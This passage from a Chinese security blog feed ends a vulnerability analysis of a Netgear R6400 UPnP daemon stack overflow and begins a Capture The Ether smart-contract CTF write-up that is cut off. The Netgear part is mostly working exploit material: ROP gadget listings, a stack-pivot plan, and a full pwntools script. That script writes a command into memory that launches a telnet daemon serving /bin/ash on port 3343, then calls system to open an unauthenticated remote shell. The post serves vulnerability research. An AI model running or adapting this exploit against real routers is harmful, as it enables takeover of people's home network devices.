0x000db150</span></span><br><span class="line">[0x00024688] custom_nvram initialised</span><br><span class="line">[0xff757d34] fopen(<span class="string">&#x27;/tmp/nvram.ini&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) = 0x000db150</span><br><span class="line">[nvram 0] upnpd_debug_level = 9</span><br><span class="line">[nvram 1] lan_ipaddr = 127.0.0.1</span><br><span class="line">[nvram 2] hwver = R6400</span><br><span class="line">[nvram 3] friendly_name = R6400</span><br><span class="line">[nvram 4] upnp_enable = 1</span><br><span class="line">[nvram 5] upnp_turn_on = 1</span><br><span class="line">[nvram 6] upnp_advert_period = 30</span><br><span class="line">[nvram 7] upnp_advert_ttl = 4</span><br><span class="line">[nvram 8] upnp_portmap_entry = 1</span><br><span class="line">[nvram 9] upnp_duration = 3600</span><br><span class="line">[nvram 10] upnp_DHCPServerConfigurable = 1</span><br><span class="line">[nvram 11] wps_is_upnp = 0</span><br><span class="line">[nvram 12] upnp_sa_uuid = 00000000000000000000</span><br><span class="line">[nvram 13] lan_hwaddr = AA:BB:CC:DD:EE:FF</span><br><span class="line">[nvram 14] lan_hwaddr =</span><br><span class="line">Read 15 entries from /tmp/nvram.ini</span><br><span class="line">acosNvramConfig_get(<span class="string">&#x27;upnpd_debug_level&#x27;</span>) = <span class="string">&#x27;9&#x27;</span></span><br><span class="line">[0x00024728] acosNvramConfig_get(<span class="string">&#x27;upnpd_debug_level&#x27;</span>) = <span class="string">&#x27;9&#x27;</span></span><br><span class="line">set_value_to_org_xml:1136()</span><br><span class="line">[0x0000e5e8] fopen(<span class="string">&#x27;/www/Public_UPNP_gatedesc.xml&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) = 0x000db150</span><br><span class="line">[0x0000e620] fopen(<span class="string">&#x27;/tmp/upnp_xml&#x27;</span>, <span class="string">&#x27;wb+&#x27;</span>) = 0x000db150</span><br><span class="line">data2XML()</span><br><span class="line">[0x0000f7d0] acosNvramConfig_get(<span class="string">&#x27;lan_ipaddr&#x27;</span>) = <span class="string">&#x27;127.0.0.1&#x27;</span></span><br></pre></td></tr></table></figure><p>PS: 操作的过程没有看到 qemu， 那是因为我系统有 qemu binfmt 的支持。</p><h2 id="利用编写"><a href="#利用编写" class="headerlink" title="利用编写"></a>利用编写</h2><p>由于漏洞的根本原因是 <code>strncpy</code> 的缓冲区溢出， 我们知道 <code>strncpy</code> 函数在溢出的时候会存在 <code>\x00</code> 截断。然而程序每次不同链接使用的是同一块内存， 我们可以在第一次 <code>recvfrom</code> 的时候在栈上布局好 rop, 然后通过栈迁移跳转到布局好的 rop 上。</p><ol><li>第一次连接布局好 rop</li><li>第二次连接, 构造缓冲区溢出，栈迁移到 rop 上，然后执行任意命令</li></ol><p>整体思路可以参考 【4】<a href="https://ssd-disclosure.com/ssd-advisory-netgear-nighthawk-r8300-upnpd-preauth-rce/">SSD Advisory - Netgear Nighthawk R8300 upnpd PreAuth RCE - SSD Secure Disclosure (ssd-disclosure.com)</a></p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-06-28-72c8aa776b04fb7ce53044c6d1e8728d-c1cff6.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-06-28-72c8aa776b04fb7ce53044c6d1e8728d-c1cff6.png"></a></p><p>明确了思路我们就需要开始构造 rop， 找齐所需的 gadget 。</p><p>通过查看 <code>sub_22D20</code> 函数返回的地方汇编可知， 栈溢出后，我们可控的寄存器为 <code>R4、R5、R6、PC</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">loc_22DB8</span><br><span class="line">MOV             R0, R4</span><br><span class="line">ADD             SP, SP, #0x80</span><br><span class="line">POP             &#123;R4-R6,PC&#125;</span><br></pre></td></tr></table></figure><p>其中 <code>PC</code> 寄存器为需要的栈迁移 gadget </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ropper -f usr/sbin/upnpd --search <span class="string">&quot;add sp, sp&quot;</span></span><br></pre></td></tr></table></figure><p>这里我选择了这条 gadget, 将栈迁移到 <code>SP+0x800</code> 的位置， 另外通过这条 gadget 我可以接着控制 <code>R4、R5、R6、PC</code>  四个寄存器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:00011B90                 ADD             SP, SP, #0x800</span><br><span class="line">.text:00011B94                 POP             &#123;R4-R6,PC&#125;</span><br></pre></td></tr></table></figure><p>另外最终我期望通过调用 <code>system</code> 函数执行任意命令， 因此我需要在 bss 这样全局的地址上写入命令， 因此我需要找对应可以往任意地址写入值的 gadget 。 在 arm 的汇编中，写入值的汇编指令为 <code>str</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">$ ropper -f usr/sbin/upnpd --search <span class="string">&quot;str r?&quot;</span></span><br><span class="line">[INFO] Load gadgets from cache</span><br><span class="line">[LOAD] loading... 100%</span><br><span class="line">[LOAD] removing double gadgets... 100%</span><br><span class="line">[INFO] Searching <span class="keyword">for</span> gadgets: str r?</span><br><span class="line"></span><br><span class="line">[INFO] File: usr/sbin/upnpd</span><br><span class="line">0x000299e8: str r0, [r3, <span class="comment">#0x214]; pop &#123;r3, r4, r5, pc&#125;;</span></span><br><span class="line">0x000167e0: str r0, [r4, <span class="comment">#0x40]; ldr r3, [pc, #0x54]; mvn r2, #0; mov r0, #0; str r2, [r3, #4]; pop &#123;r3, r4, r5, r6, r7, pc&#125;;</span></span><br><span class="line">0x0000ba2c: str r0, [r5]; mov r0, r4; pop &#123;r3, r4, r5, r6, r7, pc&#125;;</span><br><span class="line">0x0002d448: str r2, [r3, <span class="comment">#-0x974]; bl #0x3bf4; movw r0, #0x1f5; pop &#123;r3, r4, r5, pc&#125;;</span></span><br><span class="line">0x0002d468: str r2, [r3, <span class="comment">#-0x974]; pop &#123;r3, r4, r5, pc&#125;;</span></span><br><span class="line">0x0002b360: str r2, [r3, <span class="comment">#0x248]; pop &#123;r3, pc&#125;;</span></span><br><span class="line">0x000182ec: str r2, [r3, <span class="comment">#4]; bx lr;</span></span><br><span class="line">0x000167f0: str r2, [r3, <span class="comment">#4]; pop &#123;r3, r4, r5, r6, r7, pc&#125;;</span></span><br><span class="line">0x0002b458: str r2, [r3]; add sp, sp, <span class="comment">#0x10; pop &#123;r4, r5, r6, pc&#125;;</span></span><br><span class="line">0x0002af38: str r2, [r3]; bl <span class="comment">#0x326c; mov r0, r5; add sp, sp, #0x50; pop &#123;r4, r5, r6, pc&#125;;</span></span><br><span class="line">0x0000ba6c: str r2, [r3]; bx lr;</span><br><span class="line">0x0000ba60: str r2, [r3]; mov r2, <span class="comment">#7; ldr r3, [sp, #4]; str r2, [r3]; bx lr;</span></span><br><span class="line">0x00017da0: str r2, [r3]; pop &#123;r3, pc&#125;;</span><br><span class="line">0x0002b524: str r2, [r3]; pop &#123;r4, pc&#125;;</span><br><span class="line">0x0000f120: str r3, [ip]; bl <span class="comment">#0x2e94; mov r0, #0; add sp, sp, #0xc; pop &#123;r4, r5, pc&#125;;</span></span><br><span class="line">0x00029950: str r3, [r2, <span class="comment">#0x200]; pop &#123;r3, r4, r5, pc&#125;;</span></span><br><span class="line">0x000182fc: str r3, [r2, <span class="comment">#4]; bx lr;</span></span><br><span class="line">0x00013d80: str r3, [r2]; mov r0, <span class="comment">#0; add sp, sp, #0x2c; add sp, sp, #0x800; pop &#123;r4, r5, r6, r7, pc&#125;;</span></span><br><span class="line">0x00013900: str r3, [r2]; mov r0, <span class="comment">#0; add sp, sp, #0x800; pop &#123;r4, r5, r6, pc&#125;;</span></span><br><span class="line">0x00013af4: str r3, [r2]; mov r0, <span class="comment">#0; add sp, sp, #4; add sp, sp, #0x1000; pop &#123;r4, r5, r6, r7, pc&#125;;</span></span><br><span class="line">0x00017d64: str r3, [r4, <span class="comment">#0x140]; pop &#123;r4, pc&#125;;</span></span><br><span class="line">0x0000bac8: str r3, [r4]; add r0, r0, <span class="comment">#0x18400; add r0, r0, #0x2a0; pop &#123;r4, pc&#125;;</span></span><br><span class="line">0x000272ec: str r3, [r4]; pop &#123;r4, pc&#125;;</span><br><span class="line">0x0002dd64: str r3, [r5]; pop &#123;r3, r4, r5, r6, r7, pc&#125;;</span><br><span class="line">0x0000bc1c: str r3, [sp, <span class="comment">#4]; bl #0x3278; add sp, sp, #8; pop &#123;lr&#125;; add sp, sp, #0xc; bx lr;</span></span><br><span class="line">0x00014188: str r4, [sp, <span class="comment">#0xfc]; str ip, [sp, #0xf8]; bl #0x33b0; mov r0, r4; add sp, sp, #0x104; pop &#123;r4, r5, r6, r7, pc&#125;;</span></span><br><span class="line">0x00017e98: str r5, [sp, <span class="comment">#4]; bl #0x308c; mov r0, r4; bl #0x2e64; add sp, sp, #0xd4; pop &#123;r4, r5, r6, r7, pc&#125;;</span></span><br><span class="line">0x0002dd4c: str r6, [r5]; pop &#123;r3, r4, r5, r6, r7, pc&#125;;</span><br></pre></td></tr></table></figure><p>对于这样的需求，我从这些 gadget 中选取了 <code>0x0002dd4c: str r6, [r5]; pop &#123;r3, r4, r5, r6, r7, pc&#125;;</code> 这条指令， 通过控制 r5、 r6 寄存器，我们可以将任意值从r6 写到 r5 所指向到地址中。然后我通过 for 循环就可以构造出将任意字符串，写到任意地址中的 rop 链</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build_rop</span>(<span class="params">cmd</span>):</span></span><br><span class="line">    rop = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    rop += cyclic(<span class="number">355</span>,n=<span class="number">4</span>)</span><br><span class="line">    rop += p32(<span class="number">0xdeadbeaf</span>)         <span class="comment"># R4</span></span><br><span class="line">    rop += p32(bss)                <span class="comment"># R5</span></span><br><span class="line">    rop += cmd[:<span class="number">4</span>]                 <span class="comment"># R6</span></span><br><span class="line">    rop += p32(str_r6_r5)          <span class="comment"># PC</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(int(len(cmd)/<span class="number">4</span> - <span class="number">1</span>)):</span><br><span class="line">        log.success(<span class="string">&#x27;idx: &#123;&#125;&#x27;</span>.format(i))</span><br><span class="line">        rop += p32(<span class="number">0xdeadbeef</span>)         <span class="comment"># R3</span></span><br><span class="line">        rop += p32(<span class="number">0xdeadbeef</span>)         <span class="comment"># R4</span></span><br><span class="line">        rop += p32(bss+<span class="number">4</span>*(i+<span class="number">1</span>))        <span class="comment"># R5</span></span><br><span class="line">        rop += cmd[<span class="number">4</span>*(i+<span class="number">1</span>): <span class="number">4</span>*(i+<span class="number">2</span>)]   <span class="comment"># R6</span></span><br><span class="line">        rop += p32(<span class="number">0xdeadbeef</span>)         <span class="comment"># R7</span></span><br><span class="line">        rop += p32(str_r6_r5)          <span class="comment"># PC</span></span><br></pre></td></tr></table></figure><p>最后呢，在找一条 <code>mov r0, r?, bl system </code>  这样的gadget， 将为可控的 <code>R3</code> 到 <code>R7</code> 寄存器中的一个覆写成刚刚写入了命令的地址，然后将值 mov 到 <code>r0</code> 寄存器上。 因为 arm 到参数传递是由寄存器传递的，通过控制 <code>r0</code> 寄存器， 我们就可以控制 <code>system</code> 执行任意命令。</p><p>这里了使用的是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:0002704C                 MOV             R0, R4  ; command</span><br><span class="line">.text:00027050                 BL              system</span><br></pre></td></tr></table></figure><p>找齐所有的gadget ，并且将 rop 链布置到 <code>SP+0x800</code>的位置， 因此第一次链接到代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># write cmd to bss</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build_rop</span>(<span class="params">cmd</span>):</span></span><br><span class="line">    rop = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    rop += cyclic(<span class="number">355</span>,n=<span class="number">4</span>)</span><br><span class="line">    rop += p32(<span class="number">0xdeadbeaf</span>)         <span class="comment"># R4</span></span><br><span class="line">    rop += p32(bss)                <span class="comment"># R5</span></span><br><span class="line">    rop += cmd[:<span class="number">4</span>]                 <span class="comment"># R6</span></span><br><span class="line">    rop += p32(str_r6_r5)          <span class="comment"># PC</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(int(len(cmd)/<span class="number">4</span> - <span class="number">1</span>)):</span><br><span class="line">        log.success(<span class="string">&#x27;idx: &#123;&#125;&#x27;</span>.format(i))</span><br><span class="line">        rop += p32(<span class="number">0xdeadbeef</span>)         <span class="comment"># R3</span></span><br><span class="line">        rop += p32(<span class="number">0xdeadbeef</span>)         <span class="comment"># R4</span></span><br><span class="line">        rop += p32(bss+<span class="number">4</span>*(i+<span class="number">1</span>))        <span class="comment"># R5</span></span><br><span class="line">        rop += cmd[<span class="number">4</span>*(i+<span class="number">1</span>): <span class="number">4</span>*(i+<span class="number">2</span>)]   <span class="comment"># R6</span></span><br><span class="line">        rop += p32(<span class="number">0xdeadbeef</span>)         <span class="comment"># R7</span></span><br><span class="line">        rop += p32(str_r6_r5)          <span class="comment"># PC</span></span><br><span class="line"></span><br><span class="line">    rop += p32(<span class="number">0xdeadbeef</span>)         <span class="comment"># R3</span></span><br><span class="line">    rop += p32(bss)                <span class="comment"># R4</span></span><br><span class="line">    rop += p32(<span class="number">0xdeadbeef</span>)         <span class="comment"># R5</span></span><br><span class="line">    rop += p32(<span class="number">0xdeadbeef</span>)         <span class="comment"># R6</span></span><br><span class="line">    rop += p32(<span class="number">0xdeadbeef</span>)         <span class="comment"># R7</span></span><br><span class="line">    rop += p32(<span class="number">0x2704C</span>)            <span class="comment"># PC              call system</span></span><br><span class="line">    <span class="comment"># .text:0002704C                 MOV             R0, R4  ; command</span></span><br><span class="line">    <span class="comment"># .text:00027050                 BL              system</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> rop</span><br><span class="line"> </span><br><span class="line">s = remote(<span class="string">&#x27;10.0.0.1&#x27;</span>,<span class="number">1900</span>, typ=<span class="string">&#x27;udp&#x27;</span>)</span><br><span class="line">s.send(<span class="string">b&#x27;\x00&#x27;</span> + <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x1ff0</span>)</span><br><span class="line"><span class="comment"># ropchain</span></span><br><span class="line">s.send(<span class="string">b&#x27;\x00&#x27;</span> + build_rop(cmd))</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure><p>然后第二次链接，为只需劫持返回地址到 stack pivot  的地址上即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#.text:00011B90                 ADD             SP, SP, #0x800</span></span><br><span class="line"><span class="comment">#.text:00011B94                 POP             &#123;R4-R6,PC&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build_req</span>():</span></span><br><span class="line">    temp=[]</span><br><span class="line">    temp.append(<span class="string">&quot;M-SEARCH * HTTP/1.1&quot;</span>)</span><br><span class="line">    temp.append(<span class="string">&quot;HOST:239.255.255.250:1900&quot;</span>)</span><br><span class="line">    temp.append(<span class="string">&#x27;MAN: &quot;ssdp:discover&quot;&#x27;</span>)</span><br><span class="line">    temp.append(<span class="string">&quot;MX: &quot;</span> + cyclic(<span class="number">139</span>, n = <span class="number">4</span>) + p32(<span class="number">0x11B90</span>)[:<span class="number">3</span>]) <span class="comment">#seconds to delay response</span></span><br><span class="line"></span><br><span class="line">    temp=<span class="string">&#x27;\r\n&#x27;</span>.join(temp)+<span class="string">&#x27;\r\n\r\n&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># print(temp)</span></span><br><span class="line">    <span class="keyword">return</span> temp</span><br><span class="line"></span><br><span class="line">t = remote(<span class="string">&quot;10.0.0.1&quot;</span>,<span class="number">1900</span>, typ=<span class="string">&#x27;udp&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># pivot stack</span></span><br><span class="line">rop = <span class="string">&#x27;&#x27;</span></span><br><span class="line">rop += build_req()</span><br><span class="line">t.send(rop)</span><br></pre></td></tr></table></figure><p>所以最后的 exploit为如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build_req</span>():</span></span><br><span class="line">    temp=[]</span><br><span class="line">    temp.append(<span class="string">&quot;M-SEARCH * HTTP/1.1&quot;</span>)</span><br><span class="line">    temp.append(<span class="string">&quot;HOST:239.255.255.250:1900&quot;</span>)</span><br><span class="line">    temp.append(<span class="string">&#x27;MAN: &quot;ssdp:discover&quot;&#x27;</span>)</span><br><span class="line">    temp.append(<span class="string">&quot;MX: &quot;</span> + cyclic(<span class="number">139</span>, n = <span class="number">4</span>).decode(<span class="string">&#x27;latin&#x27;</span>) + p32(<span class="number">0x11B90</span>)[:<span class="number">3</span>].decode(<span class="string">&#x27;latin&#x27;</span>)) <span class="comment">#seconds to delay response</span></span><br><span class="line"></span><br><span class="line">    temp=<span class="string">&#x27;\r\n&#x27;</span>.join(temp)+<span class="string">&#x27;\r\n\r\n&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># print(temp)</span></span><br><span class="line">    <span class="keyword">return</span> temp</span><br><span class="line"></span><br><span class="line">bss = <span class="number">0x8F874</span></span><br><span class="line">str_r6_r5 = <span class="number">0x0002dd4c</span></span><br><span class="line"><span class="comment"># 0x0002dd4c: str r6, [r5]; pop &#123;r3, r4, r5, r6, r7, pc&#125;;</span></span><br><span class="line"></span><br><span class="line">cmd = <span class="string">&quot;/usr/sbin/telnetd -p 3343 -b 0.0.0.0 -l /bin/sh \x00&quot;</span></span><br><span class="line">cmd = <span class="string">b&#x27;/bin/utelnetd -p 3343 -l /bin/ash \x00&#x27;</span></span><br><span class="line">cmd += <span class="string">b&quot;\x00&quot;</span> * (len(cmd) % <span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># write cmd to bss</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build_rop</span>(<span class="params">cmd</span>):</span></span><br><span class="line">    rop = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    rop += cyclic(<span class="number">355</span>,n=<span class="number">4</span>)</span><br><span class="line">    rop += p32(<span class="number">0xdeadbeaf</span>)         <span class="comment"># R4</span></span><br><span class="line">    rop += p32(bss)                <span class="comment"># R5</span></span><br><span class="line">    rop += cmd[:<span class="number">4</span>]                 <span class="comment"># R6</span></span><br><span class="line">    rop += p32(str_r6_r5)          <span class="comment"># PC</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(int(len(cmd)/<span class="number">4</span> - <span class="number">1</span>)):</span><br><span class="line">        log.success(<span class="string">&#x27;idx: &#123;&#125;&#x27;</span>.format(i))</span><br><span class="line">        rop += p32(<span class="number">0xdeadbeef</span>)         <span class="comment"># R3</span></span><br><span class="line">        rop += p32(<span class="number">0xdeadbeef</span>)         <span class="comment"># R4</span></span><br><span class="line">        rop += p32(bss+<span class="number">4</span>*(i+<span class="number">1</span>))        <span class="comment"># R5</span></span><br><span class="line">        rop += cmd[<span class="number">4</span>*(i+<span class="number">1</span>): <span class="number">4</span>*(i+<span class="number">2</span>)]   <span class="comment"># R6</span></span><br><span class="line">        rop += p32(<span class="number">0xdeadbeef</span>)         <span class="comment"># R7</span></span><br><span class="line">        rop += p32(str_r6_r5)          <span class="comment"># PC</span></span><br><span class="line"></span><br><span class="line">    rop += p32(<span class="number">0xdeadbeef</span>)         <span class="comment"># R3</span></span><br><span class="line">    rop += p32(bss)                <span class="comment"># R4</span></span><br><span class="line">    rop += p32(<span class="number">0xdeadbeef</span>)         <span class="comment"># R5</span></span><br><span class="line">    rop += p32(<span class="number">0xdeadbeef</span>)         <span class="comment"># R6</span></span><br><span class="line">    rop += p32(<span class="number">0xdeadbeef</span>)         <span class="comment"># R7</span></span><br><span class="line">    rop += p32(<span class="number">0x2704C</span>)            <span class="comment"># PC              call system</span></span><br><span class="line">    <span class="comment"># .text:0002704C                 MOV             R0, R4  ; command</span></span><br><span class="line">    <span class="comment"># .text:00027050                 BL              system</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> rop</span><br><span class="line"></span><br><span class="line">s = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">1900</span>, typ=<span class="string">&#x27;udp&#x27;</span>)</span><br><span class="line">s.send(<span class="string">b&#x27;\x00&#x27;</span> + <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x1ff0</span>)</span><br><span class="line"><span class="comment"># ropchain</span></span><br><span class="line">s.send(<span class="string">b&#x27;\x00&#x27;</span> + build_rop(cmd))</span><br><span class="line">s.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">t = remote(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">1900</span>, typ=<span class="string">&#x27;udp&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># pivot stack</span></span><br><span class="line">rop = <span class="string">&#x27;&#x27;</span></span><br><span class="line">rop += build_req()</span><br><span class="line"></span><br><span class="line">print(<span class="string">&#x27;exploit .....&#x27;</span>)</span><br><span class="line"></span><br><span class="line">t.send(rop)</span><br></pre></td></tr></table></figure><h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p>【1】 <a href="https://kb.netgear.com/000064493/Security-Advisory-for-Post-Authentication-Buffer-Overflow-on-Some-Routers-Extenders-and-WiFi-Systems-PSV-2020-0437">PSV-2020-0437 官方公告</a><br>【2】 <a href="https://www.downloads.netgear.com/files/GDC/R6400v2/R6400v2-V1.0.4.102_10.0.75.zip">R6400v2-1.0.4.102 固件</a><br>【3】 <a href="https://github.com/therealsaumil/custom_nvram">Shared Library to intercept nvram</a><br>【4】 <a href="https://ssd-disclosure.com/ssd-advisory-netgear-nighthawk-r8300-upnpd-preauth-rce/">SSD Advisory - Netgear Nighthawk R8300 upnpd PreAuth RCE - SSD</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="漏洞分析" scheme="https://bestwing.me/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
    <category term="CVE-2021-45527" scheme="https://bestwing.me/tags/CVE-2021-45527/"/>
    
    <category term="netgear" scheme="https://bestwing.me/tags/netgear/"/>
    
  </entry>
  
  <entry>
    <title>Capture The Ether Writeup</title>
    <link href="https://bestwing.me/Capture-The-Ether-writeup.html"/>
    <id>https://bestwing.me/Capture-The-Ether-writeup.html</id>
    <published>2022-05-06T16:00:00.000Z</published>
    <updated>2022-05-07T11:19:40.814Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p>Capture the ether 是一个适合用来入门合约的 wargame 平台。我最近一直到五一花了点时间做了下一下。 另外这里感谢 @0x9k @pikachu @xhyumiracle @iczc 给我提供的帮助。</p><h2 id="平台地址"><a href="#平台地址" class="headerlink" title="平台地址"></a>平台地址</h2><p><a href="https://capturetheether.com/challenges/">Capture the Ether - Challenges</a></p><h2 id="Warmup"><a href="#Warmup" class="headerlink" title="Warmup"></a>Warmup</h2><h3 id="1-Deploy-a-contract"><a href="#1-Deploy-a-contract" class="headerlink" title="1. Deploy a contract"></a>1. Deploy a contract</h3><p><strong>题目描述：</strong></p><p>To complete this challenge, you need to:</p><ol><li>Install <a href="https://metamask.io/">MetaMask</a>.</li><li>Switch to the <strong>Ropsten test network</strong>.</li><li>Get some Ropsten ether. Clicking the “buy” button in MetaMask will take you to a <em>faucet</em> that gives out free test ether.</li></ol><p>After you’ve done that, press the red button on the left to deploy the challenge contract.</p><p>You don’t need to do anything with the contract once it’s deployed. Just click the “Check Solution” button to verify that you deployed successfully.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract DeployChallenge &#123;</span><br><span class="line">    &#x2F;&#x2F; This tells the CaptureTheFlag contract that the challenge is complete.</span><br><span class="line">    function isComplete() public pure returns (bool) &#123;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>解题</strong></p><p>安装完 <code>MetaMask</code> 后， 开启测试网络。</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-04-19-d8ab7eb4741c491ecc1eff595c57683a-f7da6b.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-04-19-d8ab7eb4741c491ecc1eff595c57683a-f7da6b.png"></a></p><p>获取代币： 通常 <code>MetaMask</code> 切换到 Ropsten 测试网络后， 点击购买， 可以看到一个 <code>测试水管</code> ，可以从一个水龙头获取代币</p><p>水龙头： <a 